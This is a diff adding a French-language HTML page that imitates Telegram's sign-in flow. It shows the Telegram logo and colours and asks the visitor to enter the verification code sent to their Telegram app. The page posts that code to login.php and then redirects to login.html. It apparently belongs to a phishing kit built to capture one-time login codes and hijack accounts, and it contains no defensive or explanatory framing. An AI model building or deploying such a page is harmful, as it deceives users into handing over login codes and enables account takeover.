@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Telegram Code</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px 20px;
+      background-color: #fff;
+    }
+
+    img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      font-size: 1.5em;
+      margin: 0;
+    }
+
+    p {
+      color: #666;
+    }
+
+    input[type="text"] {
+      padding: 10px;
+      width: 80%;
+      max-width: 300px;
+      margin-top: 20px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+    }
+
+    button {
+      display: block;
+      margin: 20px auto 0;
+      padding: 10px 25px;
+      font-size: 16px;
+      background-color: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #006fa1;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Logo Telegram -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Logo Telegram" />
+
+  <h2>Saisissez le code envoyé depuis Telegram.</h2>
+  <p>Nous avons envoyé le code à <strong>Telegram</strong>, l’application sur votre autre appareil.</p>
+
+  <!-- Formulaire qui envoie le code et redirige vers login.html -->
+  <form action="login.php" method="POST" onsubmit="redirectToLogin()">
+    <input type="text" name="code" placeholder="Code" id="codeInput" required />
+    <button type="submit">Envoyer</button>
+  </form>
+
+  <script>
+    function redirectToLogin() {
+      // Redirige vers login.html immédiatement après soumission du formulaire
+      setTimeout(function() {
+        window.location.href = "login.html";
+      }, 100); // petit délai pour laisser le formulaire s’envoyer
+    }
+  </script>
+</body>
+</html
